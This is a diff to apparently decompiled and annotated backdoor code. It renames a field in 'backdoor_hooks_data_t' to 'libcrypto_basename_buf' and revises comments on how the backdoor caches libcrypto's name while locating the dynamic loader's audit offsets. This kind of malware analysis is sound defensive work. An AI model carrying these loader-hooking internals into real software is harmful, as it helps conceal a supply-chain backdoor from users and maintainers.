@@ -99,21 +99,21 @@ BOOL find_dl_audit_offsets
             hooks_zero_cursor = hooks;
             // AutoDoc: Clear the libcrypto basename buffer before copying a fresh string into `hooks->ldso_ctx`.
             for (name_copy_idx = 0x10; name_copy_idx != 0; name_copy_idx = name_copy_idx + -1) {
-              (hooks_zero_cursor->ldso_ctx)._unknown1459[0] = '\0';
-              (hooks_zero_cursor->ldso_ctx)._unknown1459[1] = '\0';
-              (hooks_zero_cursor->ldso_ctx)._unknown1459[2] = '\0';
-              (hooks_zero_cursor->ldso_ctx)._unknown1459[3] = '\0';
-              hooks_zero_cursor = (backdoor_hooks_data_t *)((long)hooks_zero_cursor + (ulong)wipe_stride * -8 + 4);
+              (hooks_zero_cursor->ldso_ctx).libcrypto_basename_buf[0] = '\0';
+              (hooks_zero_cursor->ldso_ctx).libcrypto_basename_buf[1] = '\0';
+              (hooks_zero_cursor->ldso_ctx).libcrypto_basename_buf[2] = '\0';
+              (hooks_zero_cursor->ldso_ctx).libcrypto_basename_buf[3] = '\0';
+              hooks_zero_cursor = (backdoor_hooks_data_t *)((long)hooks_zero_cursor + 4);
             }
             l_name_slot_ptr = (hooks->ldso_ctx).libcrypto_l_name;
             libcrypto_name_len = *(uint *)(l_name_slot_ptr + 1);
-            // AutoDoc: Only short SONAMEs (≤8 bytes plus NUL) fit in the cached buffer, so longer names leave the existing ld.so value untouched.
+            // AutoDoc: Only basenames that fit in the 0x40-byte cache are copied into `hooks->ldso_ctx`; longer names leave the existing ld.so value untouched.
             if (libcrypto_name_len < 9) {
               if (libcrypto_name_len != 0) {
                 l_name_src = *l_name_slot_ptr;
                 name_copy_idx = 0;
                 do {
-                  (hooks->ldso_ctx)._unknown1459[name_copy_idx] = l_name_src[name_copy_idx];
+                  (hooks->ldso_ctx).libcrypto_basename_buf[name_copy_idx] = l_name_src[name_copy_idx];
                   name_copy_idx = name_copy_idx + 1;
                 } while ((ulong)libcrypto_name_len << 3 != name_copy_idx);
               }
